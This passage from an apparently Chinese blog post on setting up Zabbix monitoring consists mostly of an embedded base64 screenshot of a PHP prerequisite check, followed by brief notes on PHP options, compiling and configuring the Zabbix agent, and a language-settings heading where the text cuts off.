I0vPTYPJrB2AH5EvaxZ3f8ETNuIzIpldnC1b8fhOep8pySck3WXnxcqN8E5BDgg+iQvrVbEmnPpeJUWKdUL/mG4BDhPcbmIKab0Qw0Tf+d51pfFMKQyjLB99vakhlqyK/Wowq0vuHaVkOz1zikGrfF9fdcSiP7YQkjUTfGORtye6qXQLABwffwBSs9o3slczE39MiO/kmEL6MbfJ+s/INRvsm4B0GcFDgG5iEtX6/cYWntzsZZ3LfKEmM/n6j2pFCc0g0UPRTUSe3kRKPaT++PwEcCvgGJmK9v09zfzOdm2kzGrzfpJ8902qRo1yhEoP9gCbJaUa98aTTxTrhQNnlW5ZOur21SwD44OAbmI71/v2N/cOB7ZVT+AYA9o30xMaDFHxo8A0AALQA3wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtADfAABAC768/PU3iUQikUhTJ95vAACgBfgGAABagG8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBfgGAABagG8AAKAF+AYAAFpQ+OZ+8e37V51m97F8sbRZy/P1md/11B3nhxxfv9oq6yJNnXTPfgsAEstZXFlztf4843tlZfm9cSHDOzB+21MU/Vhh7eXX6eXRD5dufvvCt7e7m97m5Xn34jc3peIb5ZXX7sRtjvvmrHuypYKpqTdXg28A6izn0RMS4wpnjO+1hZs+/MFqVtx2iZnutlcHZU95uNAWEalc/XqM+eAbXb4d476JU3Z930RFKcwIWeEvZvOkFl94tpjhG4BVyHqpPk1bKntrKxHel8ptVw/c40O2Rzx2V0c/H/yGJZVE3zzenu8oG8O4b+Lm2r4p9WOIx8oC8GqxX+HKQgAYYPwzQG2vrDv3nPdBot7Ho3LbJbKFu10JhnuJfEm7uPMbnqgZlxHZ9OpswYrfb8L7eFkuKfkmK9daEozk45DEfLUQAKqMR67qXlUoH3ZYYu9O9bbrd5rxUdsfar4RwUTf+N91pvFNKQyhLB/+nlaSPQIEtVQLAaCCLLHqqrSM73V8lMD3gRi67VJ+eL6RvZKZ+HtaZHvf1F9lqoUAUGBWx8j6Gt8b0UEQdmfstptQGXZJtQ9x29f6/cYVnt7uZJzpfZOO1T/VVAsBQDG+uMb3qse4j/SHUvvPiognAe1Q/z7N/c10bqbNaOAb5/nv8kRwnb/WuN97rrtjfAPQQ1aZ+mXUPyzLipPM+N7scNbX+7Hytrto+fFu+3r//sb+4cD2yil8My08ZwEAfFqm942YPzwL8JwFAPBZafp+AwAAnxZ8AwAALcA3AADQAnwDAAAtwDcAANACfAMAAC3ANwAA0AJ8AwAALcA3AADQgi8vf/1NIpFIJNLUifcbAABoAb4BAIAW4BsAAGgBvgEAgBbgGwAAaAG+AQCAFuAbAABoAb4BAIAW4BsAAGjBmG+er88WS5/PeOqOZ/c+bxmsCQDb89qdfP/6bSCddM++GsDHQPtmdHK75DSziW+Ws6KRuaso5boR06bfdb/I6ufV1mE5j2cJDLVpy1X75kKy00lT8aiiTYC2LOfH168+D/C+vPw6vTz64dLNb1/49nZ309u8PO9e/Oam7PZ+k4XjelAuvBID+rhv1HnFgpu9PA34ptam89BZ9+TKM99IvtjFEyX8QfANTMTDhbaISOXq12PMB9/o8u3Y2DfqfSWLxUNKKL1iZGCj9tq+kZq9ZeY8YVqYL2I3pAUpXMxW+ia2acrPFrMkEuWb8hBXOV4yQGvwDUzCY3d19PPBb1hSSfTN4+35jrIxFL4Z/qSmH+39+00I+kXKXwIKr8TNtX3Tj/vpWPUKItXcapS9K3wTN03GHJ5eoZJvKi9JAC1Z4/s2L9ywO/Il7eLOb3iiZlxGZNOrswW195veY5R66rf4N4m1wrGN/pUVUpZLSr7R5bWXm/ieEfJJV3neM9RmODzYJfNNXMz+eiUV5gNoB+83MAU134hgom/87zoT+UYerFS8zsJ3eObS+vGY2F1EeaF8jwmU5eks4oaxsC41e77RryMDvqm1GQ63/TGLefT9Jr0GAfwB8A1MwWrfyF7JvPf3tIAJ2e7pPgvuAVMoQXngfX/0e1pke98oSaS8dozOe1b7xl2p/Jbje9U/BN/AHwXfwCSs9fuNKzy93ck4w38vIPHX+KMI3Bazywfl1+ekIhOgK5Un8E06Vv1+IzJwq1H2buEb31rqlWo8buIb+HPgG5iI9f4+zf3NdG6mzaj6RqKzi602dveCrPKNvOL4F5p2vok9PL7u8heUWLiNb/zllL2SNm2qXB1AO/ANTMd6//7G/uHA9srRvonfx8rA6qwjaXbv8vm899H/D/y1DH9FBodPXJi8XsPHZvh72v6Slp/+3gUAAPvMR/QNAAB8PPANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEALvrz89TeJRCKRSFMn3m8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBfgGAABagG8AAKAF+AYAAFqAbwAAoAVjvnm+PlssfT7jqTue3fu8ZbAmAGzPa3fy/eu3gXTSPftqAB8D7ZvRye2S08wmvlnOikbmrqKU60ZMm37X/SKrn1dbh+U8nqUk7Ro6S6/821n3ZPcYpJO1coAGLOfH168+D/C+vPw6vTz64dLNb1/49nZ309u8PO9e/Oam7PZ+I+E7xl+XykBfeMW06TbHfaPOKxbc7OVpbd/UzlKUK+zFpl0jZwGYAnwDE/FwoS0iUrn69RjzwTe6fDs29o16X0kP+Cveb7RXTJi23wHW9o3U7C2z8BYymy9iN8LLx2K2hW/iWYZ8I0LKu7G5CAF2Ad/AJDx2V0c/H/yGJZVE3zzenu8oG0Phm+FPavpjsX+/CUG/SPln5cIrcXNt31QEEI+VtyXvG6nmVqPs3dg3cbNyOkG6xwc0aMnwYoyJn3Bgd+RL2sWd3/BEzbiMyKZXZwtq7ze9x6j4Eczj3yQGYnqOjf6VFVKWS0om0OW9ZzpTIYb+kE+6yvMFuW9qZynLfYezNlMdnjehHbzfwBTUfCOCib7xv+tM5Bt5sFLxOgu14ZlL68djonAlypfvMYGyPJ1FonnlDSMiNXu+0b+mrO2b2lkGyrOTeswlsP6hHfgGpmC1b2SvZN77e1rAhNf0XF/GWSkUVQy8749+T4ts75voGJ1Ph+d5SxLD1r6xF1usdnwDTcE3MAlr/X7jCk9vdzLO8N8LSNQ2/sgCt8f7xvD6nFRkInWl8gS+Sceq32+SD2Rv3pP4PVAyXoeb+kZWu7Fp2mU3Wf/QDnwDE7He36e5v5nOzbQZVd9IzHWx1cbuXvxVvpFXnBTBG/km9vD4ukvvOl6QrrDoSXwV0y9G1bP4lnVS1fTe2BRAE/ANTMd6//7G/uHA9srRvolBudSGs46k2b3L5/M+ROH8S1oL9M82AIdJXJgrn8MA9prh72n7S1p+vGQAAHwUPqJvAADg44FvAACgBfgGAABagG8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBfgGAABa8OXlr79JJBKJRJo68X4DAAAtwDcAANACfAMAAC3ANwAA0AJ8AwAALcA3AADQAnwDAAAtwDcAANACfAMAAC0Y883z9dli6fMZT93x7N7nLYM1AWB7XruT71+/DaST7tlXA/gYaN+MTm6XnGY28c1yVjQydxWlXDdi2vS77hdZ/bzaOizn8SyBXptbrtXaLWLZQxuW8+PrV58HeF9efp1eHv1w6ea3L3x7u7vpbV6edy9+c1N2e7+RyF7E3yLQl14xbbrNcd+o80qI3+zlacA37/kGJr096578FkAL8A1MxMOFtohI5erXY8wH3+jy7djYN+p9JQXcFe832itGBvaFYG3fSM3eMgvvK7P5InZDWpDCxWxN34jJjk/O5BDZld5dUs3QZtmg9k24IsGUS9468tofmzo/1BrAOuAbmITH7uro54PfsKSS6JvH2/MdZWMofFP7XuSS/mpk4qaoIgT9IuXflwqvxM21fVNRRTxW3pZ83JdqbjXK3rV9E/uQ+iOvR6lNd5TsLe5A0q2p5vOmP7YP7jbaPqSaw60BVBhejDExi2B35EvaxZ3f8ETNuIzIpldnC2rvN73HqPgRzOOf09d6SLfRv7JCynJJyTe6vPdMl+J7yidd5XlP0abbK+s5NJ5k4Molr7/LFW0miwjmWuyx5kBXqFuWvZIfaQ1gHXi/gSmo+UYEE33jf9eZyDcSLovYGjclkkrI1vrxmJBdiaHilUrlXnk6iw79NbJYH3yzIppX2wxeEaSCElI0hC5Mgsn7YM9ursUUepvqlrVvBloDWAd8A1Ow2jeyVzLv/T0tEENnEVgdplBUEdxTpPwd//19Ex2j8+nwPO9Zxze9yzSGGPpeUd4Wc/i88x/TDNJymR9pDWAd8A1Mwlq/37jC09udjDP89wISUo0/isBtMbu8Kl6f85jbrzyBb9Kx6vebFOJl78a+Uf2xF27L01H2RKrN0jfupLFEWvZ2STWHWwNYB3wDE7He36e5v5nOzbQZVd9IZDRvKiY42jCagrJH+SYFVjmqkW9iD4+vu/ReYj0RCjf2jb8W30JY1aHN8vNXskgge32xLcufycmx6RRDrQGsA76B6Vjv39/YPxzYXjnaNzHgltpw1pE0u3f5fN776P8HvhfJjyJ78aJgbou6J4XJAHYhPQkxqeBDM/w9bX9Jy28/XhRsfzLX4hsAgJKP6BsAAPh44BsAAGgBvgEAgBbgGwAAaAG+AQCAFuAbAABoAb4BAIAW4BsAAGgBvgEAgBZ8efnrbxKJRCKRpk683wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtADfAABAC/ANAAC0oPDN/eLb9686ze5j+WJps5bn6zO/66k7zg85vn61VQJSYS6HLudfT7rnt9fuJGtqG2KbAAfNchZXVm3CmzXl9srKGqJcvLAjKwYlRdGz7skXFaT4aVEN9uJnM15+nV4e/XDp5rcvfHu7u+ltXp53L35zUyq+UVMzumHcN/q2mpr5XS7dgG8A1sPoJEQlCUkqQgmyCvxSquwNuFi264qDyPig2PjmneGfsEskeBq1pAPfIyTuyMOFtohI5erXY8wH3+jy7Rj3jdxQe+/W903v3kU36Peba1kqUebhLIZwuD2qcwMj7UsH0iDhG/hsyKtMPud1OBtaERIc58XihXejPyhmIMbeNa2iTrpl9n7Te0ZvzWN3dfTzwW9YUkn0zePt+Y6yMYz7Jm6u7Zti0xBXgvKNH6RU2RTazHLuxSO7ko38m2msH9sE+BzIiisCWembfN0JLpCVixfei/qgzDob4kLUqpHip8HGOlt//LvoZMiXtIs7v+GJmnEZkU2vzhas+P0mvHaU5ZKSb7LycmZHNyjfhGbVm42pdnKWLKLWjxobt35UmwCfAbUcElLol5uskV4FU2gXF76ZhuqgyBuPGpQBf2S+kUNcNLPP4rG8GTXfiGCib/zvOtP4pjY1y/J0v6o3XRPdoHwTm1Jf0rJ8OiobG3wDnw+Z7XVhyNKwD3nHs3m5IsxRPtjhmwkYGhQf5SxSpx4bM99oknsasto3slcyE39Pi7yzb4JXVN7slffQ0FQ8Ct/AZ0YC0Oj6cugwZ4kqignlvBsjg6JD03BsHPNNPo5NWOv3G1d4eruTcf6Mb/w9Tcea9m0dU5J24Rv43KQFUiOtAv0M12doUcNWjA+K+n7j/jSgKg/tG5UfH8cpWe/v09zfTOdm2ow/9D0t/H2abTONkMG3nNYSvoFPisz87B3FzvliabhdIXjVlga+eU9WDoq74WmXoTcoKqYJ9k+ibFKFrVnv39/YPxzYXjmFbwAAACYB3wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtADfAABAC/ANAAC04MvLX3+TSCQSiTR14v0GAABagG8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBfgGAABagG8AAKAF+AYAAFqAbwD2ltfu5PvXbwPppHv21QA+BoVv7hfFnJ7dx/LF0mYtz9dnftdTd5wfcnz9aqtsizQ4V6caRxak7Zjp4Vn35AoBDpHlfNfFBTDEy6/Ty6MfLt389oVvb3c3vc3L8+7Fb25KxTfKKzqaj/hGB/qd4/5mvongGzh08A1MxMOFtohI5erXY8wH3+jy7Rj3zdty5t5X1vdNVJQntGAIu6xROtOCvA+ZY6VxyacGjW+SP+Rc/tOBa0H+9/hEDnd597+hNV/Nboae2E4eS+EWJgPYD/ANTMJjd3X088FvWFJJ9M3j7fmOsjGM+yZuru2bUj8GE/1tSVwtUsdLyNjISyIeKBmxgtnlzricGVU4T5humIzViTt7dJjyk7Tp9i7nqvGs/wB7T3psGkz8hAO7I1/SLu78hidqxmVENr06W7Di95vwPFWWS0q+ycorYd3UOTlLX8miWrS3ojCCb8Ku127WLa/PpFnjD1di3m+Kd6bkG+lq6EPYq84I8FHh/QamoOYbEUz0jf9dZxrfVITRKx/+nlZHfVVLRjGM+EYy5vHN/K+pYFeaqWwbiY4x1H2j/SeHqDMCfFTwDUzBat/IXslM/D0tsptv5L2k81/VDCr6j/lGXDJfujUm1oktrPRNrz/4Bg4AfAOTsNbvN67w9HYn4zTwjTlWva+4zFq+cb/cuPO+dpLXfzUguZpv1O830pTdq9oE+KjgG5iI9f4+zf3NdG6mzZjaN9oN4ai1fSMvRsk9/d9sdF4y/b9P84fgGzgA8A1Mx3r//sb+4cD2yil8AwD7Rnp+qj0LAnwY8A0AALQA3wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtADfAABAC768/PU3iUQikUhTJ95vAACgBfgGAABagG8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBfgGAABagG8AAKAF+AZgb3ntTr5//TaQTrpnXw3gY1D45n5RzOnZfSxfLG3W8nx95nc9dcf5IcfXr7bKtkiDc3WqbVnOv75LOwB7wnK+6+ICGOLl1+nl0Q+Xbn77wre3u5ve5uV59+I3N6XiG+UVebyym+O+OeuebKlgaurNzcE3AFXwDUzEw4W2iEjl6tdjzAff6PLtGPfN23Lm3lfW901UlCe0YAi7rFE604K8D5ljpXHJpwatJ4wwTs7k5cl9NxB/2GrpM0I40CT/HuYOl5LFTPmmPFZ6cnwiHdBdBdhr8A1MwmN3dfTzwW9YUkn0zePt+Y6yMYz7Jm6u7ZtSPwYT3G1JXC1WCS5vbGSVow6UTPBNbCo1K6qwp7bOSA26vdJP1bJtZ+DYpCiAfcTOUvecNJT4CQd2R76kXdz5DU/UjMuIbHp1tmDF7zfheaosl5R8k5VX3hhMHXlTCW8bSQDKW3IKWyh7o2/8IVItLi157ymWWe9YQ8jXjlWuAvgo8H4DU1DzjQgm+sb/rjONb2qfmMry4e9pddRXtcwKK3wTPCHVMquFCqnEHqsUlfkmVTPJFIpvapcJsMfgG5iC1b6RvZKZ+HtaZDffGA3MOv9VzbCdb3y1iO5S71iD9k15LL6BDwi+gUlY6/cbV3h6u5NxGvjGHGsdYGo6fygrrOkbfRb5YUbKU5ekEb83fSir/X4Tj8U38AHBNzAR6/19mvub6dxMmzG1b7LI7o/awjcG+VYWP4gJVjNScnx9n84ih7vCznvOUB6Lb+ADgm9gOtb79zf2Dwe2V07hGwDYN+TxyD0w8ZAEHxp8AwAALcA3AADQAnwDAAAtwDcAANACfAMAAC3ANwAA0AJ8AwAALcA3AADQAnwDAAAtwDcAANCCLy9//U0ikUgk0tSJ9xsAAGgBvgEAgBbgGwAAaAG+AQCAFuAbAABoAb4BAIAW4BsAAGgBvgEAgBbgGwAAaMHe+OapOz7pnvv5t7fl7PvXb/V0fP3qK5lDenttmi99jbfn67OF26hUPuue7K63+4U6pLdpejN3jQz0KrYTMS189+cF2IzX7qSYYCqpNQLwISh8I8Exm9Oz+1iug6aJ3X5XL3YnBwyxnCcNmHxsZ9A3KYgnZ9h85hvfVY1ZrskWuh2NmCMeu5xn/S82BdOmaqdeIbsh/WQPkWpre6gmrfLO965O7nNW2HNkrlLYcyqTDeCdePl1enn0w6Wb377w7e3uprd5ed69+M1NqfhGxbUYE8d9o4OaqVkP657cJRITV/umiJIppeVXBt+YbEjN9+oLMY3HTbmoVE0OzE8do/P9wvRZornea9LohVcw92rNiD/kG3XG0i7ixcVMKdldjrJyGkT4EOAbmIiHC20RkcrVr8eYD77R5dsx7huJUHaKr++bFY/tKr6v+R5gDkntm/PGxk0+800ldJpTKElYh+kWku0sapc1QdambiqSFep+5qLKkr452SWMsYZv3Eljh81ec71SR/cw841cvnY/7Dn4Bibhsbs6+vngNyypJPrm8fZ8R9kYxn0TN9f2TS8I5vign3iH9xvpW1FeJnMK06Y9UfZVbdQ35uVAXYhTiz+XqTbYK9XgavIrHaa8/0L/Vit/RJOZfsYDC9+U+oH9YvUDGY8L8A7Il7SLO7/hiZpxGZFNr84WrPj9JjxP1WK6C1US9bLyMixq8vgurOGbgPTB9KcaJZNFzLG1GBpcItpYVFUxuxeJphJjF1M5BvT0KqMj+BDSydRUlvJjewKus6lvVM/VPS97RbT6WPB+A1NQ840IJvrG/64zjW9qwbQsH3y/GWdL33jbxQ44Mej+ZJF0Nnf1fbJNeUkULef9CU4ymDM6u8TAXfFNRSrF1a0mnmic2rj07rzcFnd1skt3LPV88x7C3oBvYApW+0b2Smbi72mRsnwS3+gQ6a1gorxsmlP3fsXxu8JXo7DXtGMajCtTLVGnh+zqVvvG5qUzVd/kF65ak/ujLyel4l695/tN1EnhFbMZ7hK++cjgG5iEtX6/cYWntzsZp61vTOUivGrfxF39aircG5QYPDb0ewNJOuk6Y4XrvB3pav4RaS3fOFKJ9c1rNzOnGPNN7TaaHuaHmC6tJYA1fGPO7jdrg2WvGt98bPANTMR6f5/m/mY6N9NmtPVNP+DmEX+IIlAW0Vz2xleHGMEl/qqjQj9Tzw0933hdScp9Yw4PonKnMx0I51UptJY3pVN2+abaehFE7r9uRy5frkgXhpblwnudjx1W1wsfDHwD07Hev7+xfziwvXIK30xP9IHDWaGeXACVUFsss8I3GdK+/f3GncW2f3z9P4v3legD3Y5q1pzU1lcxPfQhKXP8e1qth4Vuw1kAxkgv7oPTHuAj0Nw3LtaXn8s+IRJECB8A8Hn4A74BAIBPCL4BAIAW4BsAAGgBvgEAgBbgGwAAaAG+AQCAFuAbAABoAb4BAIAW4BsAAGjBl5e//iaRSCQSaerE+w0AALQA3wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtADfAOwtr93J96/fBtJJ9+yrAXwMCt/cL4o5PbuP5YulzVqer8/8rqfuOD/k+PrVVhnBtHbWPfkNAFiL5XyNxQWwFS+/Ti+Pfrh089sXvr3d3fQ2L8+7F7+5KRXfKK/I45XdHPeNlsc6LsE3AJuDb2AiHi60RUQqV78eYz74Rpdvx7hv3pYz976yvm+iojRyuH37mS/TJ4Kz7v+ap28Cph3J28Ov/TtTWl3pLcq0APApwTcwCY/d1dHPB79hSSXRN4+35zvKxjDum7i5tm9K/RiSgcJRpjVXJ2Zkl11LzkZWKqmpdHbjPz5bw+cgPpkNJ9YC7I58Sbu48xueqBmXEdn06mzBit9vwvNUWS5p4PcbrSVBKhQvJUkzxh+2vllarkTWWHyI829Xy3l6ram0BvA54P0GpqDmGxFM9I3/XWca35TCEMry4e9pPbQtPMk3ste0YxrxT2rpZcigfKOVNno6gEMF38AUrPaN7JXMxN/TIjv4ZvT9xubnnf+YZtDvNyFvfMN3AwB8A5Ow1u83rvD0difjTO8bdawcJebQvrE/yaRNcYy3S2o5b4HvafA5wTcwEev9fZr7m+ncTJvRwDeujvsU5lRhpRKPyl5f7Pe0mf+Als6YWlh1LoBDBd/AdKz372/sHw5sr5zCN38A/yONx/qG9xeAhHs+y5/AAD4gf9Y36uuZB98AABwmf/79BgAAPgP4BgAAWoBvAACgBfgGAABagG8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBV9e/vqbRCKRSKSpE+83AADQAnwDAAAtwDcAANACfAMAAC3ANwAA0AJ8AwAALcA3AADQAnwDAAAtwDcAANACfAOwt7x2J9+/fhtIJ92zrwbwMSh8c78o5vTsPpYvljZreb4+87ueuuP8kOPrV1tlApZz1hh8XpbzCRcXfHJefp1eHv1w6ea3L3x7u7vpbV6edy9+c1MqvlFekccruznum7PuyZYKpqbeBIB3At/ARDxcaIuIVK5+PcZ88I0u345x37wtZ+59ZX3fREUlTCP+7ce/Lem3onmomz4dhEXVK0nvN2mXP5c0OF+EExUdADgE8A1MwmN3dfTzwW9YUkn0zePt+Y6yMYz7Jm6u7ZtSP4Uk3K7UmqjI7k0Nyl6RUL8kNhWPkhJ3OiswtxrTXoAPTHqoGkzMc9gd+ZJ2cec3PFEzLiOy6dXZghW/34TnqbJcUvJNVl6+W/R/dBFJhNca+16S28XTLwlNyToMZ5G8dFJ7rn9GgAOA9xuYgppvRDDRN/53nWl8UwpDKMsH329qSGWrIr9axDdaUf7w+Nktnqgs8SLJOmPqBN8Eh+EbOEjwDUzBat/IXslM/D0tspNvAuG9ZIUPzLmKBkOJP3Do/QbfwEGDb2AS1vr9xhWe3u5knMl9oz6LGTe4mqk1++ojnvCvKYLZWy+JIpH3HmcUU+LOjm/g4ME3MBHr/X2a+5vp3Eyb0eD9Rl5B3GextFrkKFcYj5VTZF/P+iVJJKlNvwvfwMGDb2A61vv3N/YPB7ZXTuEbANg3ek9XAB8TfAMAAC3ANwAA0AJ8AwAALcA3AADQAnwDAAAtwDcAANACfAMAAC3ANwAA0AJ8AwAALcA3AADQgi8vf/1NIpFIJNLUifcbAABoAb4BAIAW4BsAAGgBvgEAgBbgGwAAaAG+AQCAFuAbAABoAb4BAIAW4BsAAGjB9L556o6/nXVPIT+7f3t77U7mS1tQYTn/+u17meQogM/Icvb9+PrVb1hMyUKtn+frM7dAJFMsnG9ZTXgvGJTtKHxzvyhujQ/0Ul69m1Yn2SHFMFjM4aIcMyS6pk1leTjLsJPMGU+659Dm+2HOOPU8eI8+yw0ftrUm1DSDJYNiRC73DT4eskDC2PUjnWAGt/ZMVgRBeEcObVBefp1eHv1w6ea3L3x7u7vpbV6edy9+c1MqvlH3Iobgcd/oGDocUtPdr7nEW8Q1mPRjU17Z1zQnWi/s7hF/2je12Q97jCzAfC3oZKeBGeViWJfzGPvwzQQc4qA8XGiLiFSufj3GfPCNLt+Ocd9Eb6/vm+ItwY9NLv9VvglPDZZ+5fuFnPq1mxV+St0w3XbDn85roq2eEJUS1fPUpq8s92E294VZ9xz+MtVe1ZrXTKzj+pkO0Te2R6oWB8Ju2o6lSwiNmJKTM+nnycX/GWsu57L3qVtkowAfDRWzEmaumuWgZkJKs3t8MzmHMCiP3dXRzwe/YUkl0TePt+c7ysYw7pu4ubZvik2HHZLogDLFdnLfmFPYM5qAW/hGo8K6GV3blPQtNpX673vlH/YrJbEpuVg3h6TPtinbeduN1GZC9rqrSDdKdSydK500tmwnZe+OBdJ9lmNjB2ImXUKltVgTDoOR0JZIs9dgplkxV+GdOYBBkS9pF3d+wxM14zIim16dLVjx+024R2W5JHdDJahl5ZVbqYbEREZb4X7h4mPEtBMlYTOh5tq+8UiJHlqbN/0vYnq/JDQlVxTOKHmppozSP6Mm7tXV4rliRu+VfOxwgfJNQHcvYjSTfKM7j28+MDL6+eIqk5kbZpTTDDFz6ay7TssN37w7BzgoNd+IYKJv/O860/imdi/K8hQHQ0QeQ/km3Ovgm/BSIu1s4xuD9M2OtKsm4bscfoP00266s1RK5EA5ow7ZwRDBW4ZQTRObsil0O1aLmtGZ1IhqvILZq5p15/Ldi7skxfuZXSC+ORjsxE5RLGBGORT6xVVZbjARBzEoq30jeyUz8fe0SFm+pW9SNEy+8bukHYmb8jOJ3bWcuWbNiK4XNH3jNR8oUs8DoSQcqMN0uDozRcJ06bcvJb29qlq6RdE3uhF9+Ajh2Ng97cV4Y/HNgeJnqfspTmNGOczeuMridMI3k3Iog7LW7zeu8PR2J+O08I2pbO61HBJDoR0J+2Duo7nJZ+eVYOr3jhIjuD3EdkmdSLotw6wir+tMpSQ5IBxlZ4Zral3f2G7bvfYCY398J1NvY8v2kMHLVOc1x9oOx57Lge4S7Llia/Emq2uEj40aVjMlsulnRtn+BB3miVSO+bIyvCOHNCjr/X2a+5vp3EybMb1vbDw9LmP0GGY8QiSV8/oTDSHtO3Wl2GpbsCkca4O+LQlTpFeiRCIX5Vrwbaqpk6qlwtgHPclCI8fXnX6tCXZxeUmjd8begayaKzEdiy2cdUsloeibVBM+LpUloBaID20uG+dhnFHhIwG8L4c4KOv9+xv7hwPbK6fwzfujPovJTa8kPWw2RqeHAktyG8BnIgthJSHk6dAWiQ9A6eED3gcGZRcm9w2shRWtn44xESwA4IDANwAA0AJ8AwAALcA3AADQAnwDAAAtwDcAANACfAMAAC3ANwAA0AJ8AwAALcA3AADQgi8vf/1NIpFIJNLUifcbAABoAb4BAIAW4BsAAGgBvgEAgBbgGwAAaAG+AQCAFuAbAABoAb4BAIAW4BsAAGgBvgHYW167k+9fvw2kk+7ZVwP4GBS+uV8Uc3p2H8sXS5u1PF+f+V1P3XF+yPH1q62yMctZOFbanKuzrWLT+gAfkeV868UFsIKXX6eXRz9cuvntC9/e7m56m5fn3Yvf3JSKb5RX5PHKbo775qx7sqWCqak3NwDfAIyBb2AiHi60RUQqV78eYz74Rpdvx7hvogPW901UlGI5d68+i9k8fQQIha5EGvSvR//TnMvmrUKkfbWZte/cJn1TFQAOFHwDk/DYXR39fPAbllQSffN4e76jbAzjvomba/um1I8hHms/RjvfpGq20DZVe79J5zV7g6tMoew1ffBdSvUBDga7NPyz1EDiJxzYHfmSdnHnNzxRMy4jsunV2YIVv9+E56myXNLA7zdaS4J5j9HvNPFtpldY8Y28AwWRaKnIIWfHsQV8A58B3m9gCmq+EcFE3/jfdabxTSkMoSwf/p5WUlWLFGaWElsM+EZXiyfKv9rhG/gM4BuYgtW+kb2Smfh7WmR730TH6Hw6XFH3TTxWYQ4/vu7cVzUB38BnAN/AJKz1+40rPL3dyTjT+yYdW/39Jv0wU/GNOq99JbKFZq9rxNgo9QHfwKGDb2Ai1vv7NPc307mZNqOBb6wY3New6/xdx38l86qwRnHKkdMlu/hq7ixmVzpdUJSqD3Co4BuYjvX+/Y39w4HtlVP4ZlrkVab3GQ0ARkl/qFZ7FgT4MEzvm/SCwp9vAgB8Xpq+3wAAwKcF3wAAQAvwDQAAtADfAABAC/ANAAC0AN8AAEAL8A0AALQA3wAAQAvwDQAAtODLy19/k0gkEok0deL9BgAAWoBvAACgBfgGAABagG8AAKAF+AYAAFqAbwAAoAX4BgAAWoBvAACgBfgGAABaML1vnrrjb2fdU8jP7t/eXruT+dIWVFjOv377XiY5CgAAPjCFb+4X9UAv5QuliOfrM79LdJIdcnz9aqtozOGinOUsq2lTWR7OMuwkc8aT7jm0+UExl1y7Ue/A5i2HO3kQN/bwCKtj+BENmnOAg/Ly6/Ty6IdLN7994dvb3U1v8/K8e/Gbm1LxjfKKCfpusygvfKPD03C0Mi8u3l41l/hgVxFYOagpLH7gwd5v3xDa9gazauy6SCsO/jiHNygPF9oiIpWrX48xH3yjy7dj3DcxeJXlw76JinLIpnFGHgFX+cZlPP3K9ws59Ws3c9X8KST5A6Xk+OTMlERZyt7ZfOzJXS7EtZPqhKeY2H9peXHta6aLUt8A/bXLjDyTanFe+grSeNz0LcTD6/0PpB6GGxLmvcGNSNay3dtlD2K2//5gp5l490y+uLGwB4QhTisO/jiHNiiP3dXRzwe/YUkl0TePt+c7ysYw7pu4ubZvik3Hcm7CX4zdZYrtuNAZMuYU9owmII49bkuzfshjJ20MDfMgVrCxuNc3jwrEZjLF+rFLumUXu+OVqktOh5hG4rkk7y8hdsZkvGyKxmVv1v+AXJ07RBqJZ3EZNSKpZTmvOiS07C9TGnQ9jBnYQ2TI7MPH2CqAthzWoMiXtIs7v+GJmnEZkU2vzhas+P3GR65euSQXEG241OUhnCmsb1w2WOR+EQKlx7QTg7vNhJpmaNcc1BhM7WxIPY/BdCSwxmMjupEYxKuFiigA5RhN3QrxVvijsrN45D6HBiVvL0QdO+AbfYhvOVxmvBsjtwX+NDJwA8sK/hQHNig134hgom/87zrT+KZ2E8vyGN1S7BtB+cZEQ9tO8I2JibEdVxIy6/omjL2ynYqqWffGA6tco23EnU4aic1Kkn7qeJ0iu8mkavG6ggnKpnIryJ2MNaW3hRUCWh7xQlb6ZqzleDfGbwv8OfyoudE3Y8RI7QGHNyirfSN7JTPx97RIWb6lb1IETL7xu6QdCcfHs7nzzXLmmjUhMsbZPhJAfQspmFajapEfxndSNxIpTyd5mXahh/EC05VmRllhBd9U7dRxlvu8vRB1rDiv37LuWNFyGriPv2AOlLTKXD48rMAf5BAHZa3fb1zh6e1OxmnhG1PZREA5JAZWG/js874cK7GyOK/ER793FCUAe4htJIvXMRDbyTHUoIq5pp1Y33dYLt+exXbbFeqg78O62msKw8UW7bjGkxWkndRtuzfrfyD2wV5RPIvvdq3ldEPiTYin0HdDXTvsFTI39BNDGHf4gxzkoKz392nub6ZzM23G9L6xMfG4EkAHkeDoRzSF0UHckNtqIdQW8do2IsG6GwussZ04mXxPfOO2wLY88zXDKWwQl5KzbhnmomktzULfAWk5lNtwn4lBkj9E9V9Pbmsm344rST2cd2FEUstyrvnC9S12JjSi7obrP8rZS/JpGWY4/FEOclDW+/c39g8HtldO4Zv3R30WcyPUS1onNhoWg5fctiMyS1Kk3gplgv1HfPPxn7wA4FCY3Dd/Gu05a770lqDSunEZ3wAAbMnB+wYAAPYCfAMAAC3ANwAA0AJ8AwAALcA3AADQAnwDAAAtwDcAANACfAMAANPz9vb/A3QTtkYQPYZ8AAAAAElFTkSuQmCC" alt="cheack_image" title="php是世界上最好的语言(Python:?)"><br>其中<strong>php选项</strong>在php.ini中修改相应配置,或在apache的conf文件中使用<em>php_value</em>来配置,其余的mod已于前面安装了</p><h2 id="配置zabbix-agent"><a href="#配置zabbix-agent" class="headerlink" title="配置zabbix_agent"></a>配置zabbix_agent</h2><p>zabbix agent简单来说就是中继服务器,中继agent与server之间的通讯,最大的作用我感觉就是均衡负载<br>之前编译的时候没有编译zabbix_agent,在<em>./configure –enable-agent</em>后编译,于<em>/usr/local/etc/zabbix_proxy.conf</em>中配置<em>Server</em>即可</p><h2 id="语言设置"><a href="#语言设置" class="headerlink" title="语言设置"></a>语言设置</h2><p>需要生成语言文件</p><figure class="highlight elixir"><table><tr><td 